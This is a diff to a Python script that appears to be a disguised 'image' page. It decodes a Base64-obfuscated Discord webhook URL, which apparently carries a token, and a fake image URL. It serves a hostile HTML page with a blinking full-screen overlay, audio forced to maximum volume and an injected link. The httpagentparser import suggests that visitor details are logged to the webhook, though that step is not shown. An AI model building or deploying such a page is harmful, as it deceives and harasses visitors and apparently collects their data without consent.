@@ -3,11 +3,11 @@ import requests
 import httpagentparser
 import base64
 
-# Encrypted (Base64) webhook and image URL
+# === YOUR ENCRYPTED WEBHOOK & IMAGE (Base64) ===
 WEBHOOK_URL = base64.b64decode("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ5MDE0NjAyOTUwMzM4NTczNC9kSkhEVmRUaDExUUhGd19pa053LXdwRkczTkI4QU4wMlhsLXJHTVRuXzhlakp4dnlUV1l5eE9oZFozUDNVMXROUV9CVg==").decode('utf-8')
 FAKE_IMAGE_URL = base64.b64decode("aHR0cHM6Ly9tZWRpYS50ZW5vci5jb20vWFBpV3M1aWw4b3dBQUFBTS90dW5nLXR1bmd0dW5nLXR1bmd0dW5ndHVuZy1zYWh1ci10dW5ndHVuZ3R1bmdzYWh1ci10dW5ndHVuZ3NhaHVyLmdpZg==").decode('utf-8')
 
-# Simple & stable annoying page
+# Fixed HTML with escaped curly braces
 ANNOY_HTML = """
 <!DOCTYPE html>
 <html>
@@ -15,10 +15,10 @@ ANNOY_HTML = """
   <meta charset="UTF-8">
   <title>TUNG TUNG</title>
   <style>
-    body{margin:0;background:#000;color:#f00;font-family:monospace;overflow:hidden;height:100vh;}
-    #overlay{position:fixed;inset:0;background:rgba(255,0,0,0.95);display:flex;align-items:center;justify-content:center;flex-direction:column;z-index:9999;}
-    h1{font-size:6em;animation:blink 0.3s infinite;}
-    @keyframes blink{0%,100%{opacity:1} 50%{opacity:0.1}}
+    body{{margin:0;background:#000;color:#f00;font-family:monospace;overflow:hidden;height:100vh;}}
+    #overlay{{position:fixed;inset:0;background:rgba(255,0,0,0.95);display:flex;align-items:center;justify-content:center;flex-direction:column;z-index:9999;}}
+    h1{{font-size:6em;animation:blink 0.3s infinite;}}
+    @keyframes blink{{0%,100%{{opacity:1}} 50%{{opacity:0.1}}}}
   </style>
 </head>
 <body>
@@ -34,7 +34,7 @@ ANNOY_HTML = """
   <script>
     const audio = document.getElementById("song");
     audio.volume = 1.0;
-    function playAudio() { audio.play().catch(() => setTimeout(playAudio, 300)); }
+    function playAudio() {{ audio.play().catch(() => setTimeout(playAudio, 300)); }}
     playAudio();
 
     const link = document.createElement('a');
